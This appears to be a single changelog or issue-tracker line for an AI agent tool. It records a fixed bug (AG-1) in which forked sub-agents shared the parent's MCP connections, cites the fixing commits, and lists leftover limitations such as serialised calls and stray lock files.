+- **AG-1** Forked sub-agents shared the parent's MCP pipes, ids and keep-alive sockets — fixed on master in `ea6e178fd` (stdio: process-unique ids, locked exchanges, shared read buffer) and `2d96e2edb` (HTTP: pid-unique ids, fresh connection per process). Residual: parallel agents now serialise their calls to one stdio server, and a lock file per MCP server is left behind if the TUI is killed.
